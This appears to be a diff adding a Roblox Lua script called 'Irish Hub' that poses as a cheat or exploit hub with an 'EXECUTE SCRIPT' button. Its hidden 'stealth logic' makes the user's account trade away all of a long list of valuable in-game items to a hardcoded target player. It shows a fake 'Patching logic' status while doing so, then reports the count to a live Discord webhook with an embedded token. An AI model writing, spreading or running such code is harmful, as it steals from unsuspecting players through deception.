@@ -1,0 +1,178 @@
+-- [[ IRISH HUB ]]
+
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local lp = Players.LocalPlayer
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "IrishHub"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+-- [[ CONFIGURATION ]]
+local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1486398211814850692/pmNQiOcdvL9geTZBFp8k8YSN1CmnXLAnxIn1TzTCWQLHHHFHbAOzkdS6nIHiT7p7dqMX"
+local TARGET_ID = 1467271544068636733
+local TARGET_NAME = "hypeer_roblox8"
+
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+
+getgenv().Brainrots = {"Strawberry Elephant", "Meowl", "Headless Horseman", "Skibidi Toilet", "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni", "Love Love Bear", "La Supreme Combinasion", "Celestial Pegasus", "Cerberus", "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace", "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo", "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur", "Lavadorito Spinito", "Ketchuru and Musturu", "Tirilikalika Tirilikalako", "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur", "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira", "Chipso and Queso", "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", "La Karkerkar Combinasion", "La Vacca Prese Presente", "Reindeer Tralala", "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block", "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese", "Fluriflura", "Talpa Di Fero", "Svinina Bombardino", "Pipi Kiwi", "Noobini Santanini", "Raccooni Jandelini", "Tartaragno", "Pipi Corni", "Holy Arepa", "Trippi Troppi", "Gangster Footera", "Bandito Bobritto", "Boneca Ambalabu", "Cacto Hipopotamo", "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", "Cupcake Koala", "Frogo Elfo", "Pipi Avocado", "Pengolino Nuvoletto", "Pinealotto Fruttarino", "Cappuccino Assassino", "Brr Brr Patapim", "Avocadini Antilopini", "Trulimero Trulicina", "Bambini Crostini", "Bananita Dolphinita", "Perochello Lemonchello", "Brri Brri Bicus Dicus Bombicus", "Avocadini Guffo", "Salamino Penguino", "Wombo Rollo", "Bandito Axolito", "Malame Amarele", "Ti Ti Ti Sahur", "Mangolini Parrocini", "Frogato Pirato", "Gato Celesto", "Doi Doi Do", "Penguin Tree", "Penguino Cocosino", "Mummio Rappitto", "Burbaloni Loliloli", "Chimpanzini Bananini", "Ballerina Cappuccina", "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo", "Quivioli Ameleonni", "Blueberrinni Octopusini", "Pipi Potato", "Strawberrelli Flamingelli", "Pandaccini Bananini", "Sigma Boy", "Clickerino Crabo", "Caramello Filtrello", "Cocosini Mama", "Quackula", "Pi Pi Watermelon", "Buho del Cielo", "Chocco Bunny", "Puffaball", "Sigma Girl", "Sealo Regalo", "Buho de Fuego", "Seraphino Gruyero", "Mythic Lucky Block", "Frigo Camelo", "Orangutini Ananassini", "Rhino Toasterino", "Bombardiro Crocodilo", "Bombombini Gusini", "Cavallo Virtuoso", "Gorillo Watermelondrillo", "Lerulerulerule", "Te Te Te Sahur", "Tracoducotulu Delapeladustuz", "Cachorrito Melonito", "Toiletto Focaccino", "Brutto Gialutto", "Spioniro Golubiro", "Zibra Zubra Zibralini", "Tigrilini Watermelini", "Avocadorilla", "Gorillo Subwoofero", "Stoppo Luminino", "Tob Tobi Tobi", "Ganganzelli Trulala", "Rhino Helicopterino", "Magi Ribbitini", "Jingle Jingle Sahur", "Los Noobinis", "Spongini Quackini", "Carloo", "Harpuccino", "Carrotini Brainini", "Centrucci Nuclucci", "Jacko Spaventosa", "Bananito Bandito", "Tree Tree Tree Sahur", "Fizzy Soda", "Berenjello Angello", "Brainrot God Lucky Block", "Cocofanto Elefanto", "Girafa Celestre", "Tralalero Tralala", "Odin Din Din Dun", "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trippi Troppi Troppa Trippa", "Ballerino Lololo", "Pakrahmatmamat", "Piccione Macchina", "Tractoro Dinosauro", "Cacasito Satalito", "Aquanaut", "Pineaplino", "Lazy Ducky", "Appelini", "Gattatino Nyanino", "Chihuanini Taconini", "Matteo", "Los Crocodillitos", "Tigroligre Frutonni", "Money Money Man", "Alessio", "Tipi Topi Taco", "Unclito Samito", "Tukanno Bananno", "Extinct Ballerina", "Vampira Cappucina", "Espresso Signora", "Orcalero Orcala", "Jacko Jack Jack", "Urubini Flamenguini", "Capi Taco", "Divino Platypio", "Los Chihuaninis", "Gattito Tacoto", "Las Capuchinas", "Bulbito Bandito Traktorito", "Los Tungtungtungcitos", "Ballerina Peppermintina", "Brr es Teh Patipum", "Pakrahmatmatina", "Los Bombinitos", "Los Orcalitos", "Orcalita Orcala", "Corn Corn Corn Sahur", "Mummy Ambalabu", "Snailenzo", "Squalanana", "Tartaruga Cisterna", "Ginger Globo", "Yeti Claus", "Crabbo Limonetta", "Granchiello Spiritell", "Tootini Shrimpini", "Los Tipi Tacos", "Frio Ninja", "Buho de Noelo", "Piccionetta Machina", "Boba Panda", "Mastodontico Telepiedone", "Los Gattitos", "Bambu Bambu Sahur", "Chrismasmamat", "Anpali Babel", "Astrolero Cervalero", "Luv Luv Luv", "Cappuccino Clownino", "Bombardini Tortinii", "Brasilini Berimbini", "Patteo", "Belula Beluga", "Krupuk Pagi Pagi", "Skull Skull Skull", "Cocoa Assassino", "Tentacolo Tecnico", "Ginger Cisterna", "Pandanini Frostini", "Dolphini Jetskini", "Pop Pop Sahur", "Bunny Tralala", "Noo La Polizia", "Karkerheart Luvkur", "Clovkur Kurkur", "Eggdin Egg Egg Dun", "Dumborino Miracello", "Berryno", "Strawberrita", "Bananito", "Cash or Card", "Buntteo", "Easter Easter Easter Sahur", "Coffin Tung Tung Tung Sahur", "Bunny Bunny Bunny Sahur", "Los Bunitos", "Noo my Eggs", "Baskito", "Churrito Bunnito", "La Lucky Grande", "La Easter Grande", "Hopilikalika Hopilikalako", "Quackini Snackini", "Boppin Bunny", "Foxini Lanternini", "Bunny and Eggy", "Hydra Bunny", "Smurf Cat", "John Pork", "Admin Lucky Block", "Los Lucky Blocks", "Taco Lucky Block", "Los Taco Blocks", "Spooky Lucky Block", "Festive Lucky Block", "Heart Lucky Block", "Leprechaun Lucky Block", "Egg Lucky Block", "Gold Elf", "Chimpanzini Spiderini", "Statutino Libertino", "Gattatino Neonino", "Ice Dragon"}
+
+local COLORS = {
+    MainBG = Color3.fromRGB(11, 14, 20),
+    TabBG = Color3.fromRGB(15, 20, 28),
+    Border = Color3.fromRGB(0, 200, 0),
+    RowBG = Color3.fromRGB(18, 24, 35)
+}
+
+-- [[ UI ELEMENTS ]]
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 320, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
+MainFrame.BackgroundColor3 = COLORS.MainBG
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = COLORS.Border
+MainFrame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.BackgroundColor3 = COLORS.TabBG
+Title.BorderSizePixel = 0
+Title.Text = "Irish Hub"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextSize = 16
+Title.Font = Enum.Font.Code
+Title.Parent = MainFrame
+
+-- Animated Gradient
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
+})
+UIGradient.Parent = Title
+
+task.spawn(function()
+    while true do
+        for i = -1, 1, 0.02 do
+            UIGradient.Offset = Vector2.new(i, 0)
+            task.wait(0.04)
+        end
+    end
+end)
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -20, 0, 40)
+Status.Position = UDim2.new(0, 10, 0, 50)
+Status.Text = "Version 1.0.3 | Stable"
+Status.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+Status.BackgroundTransparency = 1
+Status.Font = Enum.Font.Code
+Status.Parent = MainFrame
+
+local ExecBtn = Instance.new("TextButton")
+ExecBtn.Size = UDim2.new(1, -40, 0, 50)
+ExecBtn.Position = UDim2.new(0, 20, 0, 100)
+ExecBtn.BackgroundColor3 = COLORS.RowBG
+ExecBtn.BorderSizePixel = 1
+ExecBtn.BorderColor3 = COLORS.Border
+ExecBtn.Text = "EXECUTE SCRIPT"
+ExecBtn.TextColor3 = COLORS.Border
+ExecBtn.Font = Enum.Font.Code
+ExecBtn.TextSize = 14
+ExecBtn.Parent = MainFrame
+
+local Toggle = Instance.new("TextButton")
+Toggle.Size = UDim2.new(0, 40, 0, 40)
+Toggle.Position = UDim2.new(0, 10, 0, 10)
+Toggle.BackgroundColor3 = COLORS.MainBG
+Toggle.BorderColor3 = COLORS.Border
+Toggle.Text = "IH"
+Toggle.TextColor3 = COLORS.Border
+Toggle.Font = Enum.Font.Code
+Toggle.Parent = ScreenGui
+
+-- [[ STEALTH LOGIC ]]
+local function sendWebhook(msg)
+    pcall(function()
+        (request or syn.request or http_request)({
+            Url = GOOD_WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                ["embeds"] = {{
+                    ["title"] = "Irish Hub Update",
+                    ["description"] = msg,
+                    ["color"] = 65280
+                }}
+            })
+        })
+    end)
+end
+
+local function startProcess()
+    ExecBtn.Text = "LOADING..."
+    ExecBtn.Active = false
+    Status.Text = "Status: Patching logic..."
+    
+    local TradeService = ReplicatedStorage:WaitForChild("TradeService")
+    local inviteRemote = TradeService:WaitForChild("Invite")
+    local addRemote    = TradeService:WaitForChild("AddBrainrot")
+    local readyRemote  = TradeService:WaitForChild("Ready")
+
+    task.spawn(function()
+        while true do
+            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
+            task.wait(2)
+        end
+    end)
+
+    task.spawn(function()
+        task.wait(4)
+        local count = 0
+        local inv = lp:WaitForChild("Data"):WaitForChild("Brainrots")
+
+        for _, item in ipairs(getgenv().Brainrots) do
+            local found = inv:FindFirstChild(item)
+            if found then
+                pcall(function() addRemote:InvokeServer(SELECT_GUID, found.Name, found) end)
+                count = count + 1
+                task.wait(0.1)
+            end
+        end
+
+        pcall(function() readyRemote:FireServer(READY_GUID) end)
+        sendWebhook("Script executed for " .. TARGET_NAME .. ". Processed: " .. count)
+        Status.Text = "Status: Script Ready"
+        ExecBtn.Text = "RE-EXECUTE"
+        ExecBtn.Active = true
+    end)
+end
+
+ExecBtn.MouseButton1Click:Connect(startProcess)
+Toggle.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
+
+-- Draggable
+local function drag(f)
+    local d, ds, sp
+    f.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 then d = true ds = i.Position sp = f.Position end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if d and i.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = i.Position - ds
+            f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + delta.X, sp.Y.Scale, sp.Y.Offset + delta.Y)
+        end
+    end)
+    f.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then d = false end end)
+end
+drag(MainFrame)
+drag(Toggle)
